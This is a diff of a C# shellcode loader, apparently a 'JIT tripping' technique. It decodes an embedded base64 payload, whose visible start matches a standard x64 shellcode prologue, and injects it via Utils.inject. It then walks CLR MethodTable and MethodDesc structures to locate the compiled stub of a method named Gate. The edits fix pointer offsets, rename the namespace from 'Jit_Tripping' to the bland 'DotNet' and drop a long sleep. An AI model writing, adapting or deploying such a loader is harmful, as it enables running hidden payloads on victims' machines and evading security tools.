@@ -6,14 +6,14 @@ using System.Text;
 using System.Net;
 using System.Reflection;
 using System.Linq;
-using System.Runtime.CompilerServices;
-namespace Jit_Tripping
+namespace DotNet
 {
-    class Program
+    public class Program
     {
         public static void Main()
         {
-            byte[] bytes = new byte[368] {
+            byte[] bytes = new byte[368]
+            {
                 0x2f,0x45,0x69,0x44,0x35,0x50,
                 0x44,0x6f,0x77,0x41,0x41,0x41,0x41,0x45,0x46,0x52,0x51,0x56,
                 0x42,0x53,0x55,0x56,0x5a,0x49,0x4d,0x64,0x4a,0x6c,0x53,0x49,
@@ -49,15 +49,14 @@ namespace Jit_Tripping
             };
             dll ntdll = new dll();
             string base64Str = Encoding.ASCII.GetString(bytes);
-
             Utils.inject(base64Str, ntdll);
 
             MethodInfo balls = typeof(dll).GetMethod(nameof(dll.Gate), BindingFlags.Static | BindingFlags.Public);
             Type t = typeof(dll);
             Structs.Internals.MethodTable mt = (Structs.Internals.MethodTable)Marshal.PtrToStructure(t.TypeHandle.Value, typeof(Structs.Internals.MethodTable));
             Structs.Internals.EEClass ec = (Structs.Internals.EEClass)Marshal.PtrToStructure(mt.m_pEEClass, typeof(Structs.Internals.EEClass));
-            Structs.Internals.MethodDescChunk mdc = (Structs.Internals.MethodDescChunk)Marshal.PtrToStructure(IntPtr.Add(mt.m_pEEClass, (int)ec.m_pChunks), typeof(Structs.Internals.MethodDescChunk));
-            Structs.Internals.MethodDesc md = (Structs.Internals.MethodDesc)Marshal.PtrToStructure(IntPtr.Add(mt.m_pEEClass, (int)ec.m_pChunks + 0x18), typeof(Structs.Internals.MethodDesc));
+            Structs.Internals.MethodDescChunk mdc = (Structs.Internals.MethodDescChunk)Marshal.PtrToStructure(ec.m_pChunks, typeof(Structs.Internals.MethodDescChunk)); //difference
+            Structs.Internals.MethodDesc md = (Structs.Internals.MethodDesc)Marshal.PtrToStructure(IntPtr.Add(ec.m_pChunks, 0x18), typeof(Structs.Internals.MethodDesc)); //difference
             MethodInfo a = typeof(dll).GetMethod(nameof(dll.Gate), BindingFlags.Static | BindingFlags.Public);
 
             Console.WriteLine("Method Table of dll class location: 0x{0:X}", (long)t.TypeHandle.Value);
@@ -75,7 +74,7 @@ namespace Jit_Tripping
             Console.WriteLine("Method Table m_pInterfaceMap: 0x{0:X}", (long)mt.m_pInterfaceMap);
 
             Console.WriteLine("Gate Location: 0x{0:X}", (long)typeof(dll).GetMethod(nameof(dll.Gate), BindingFlags.Public | BindingFlags.Static).MethodHandle.GetFunctionPointer());
-            Thread.Sleep(100000000);        
+
         }
     }
 }
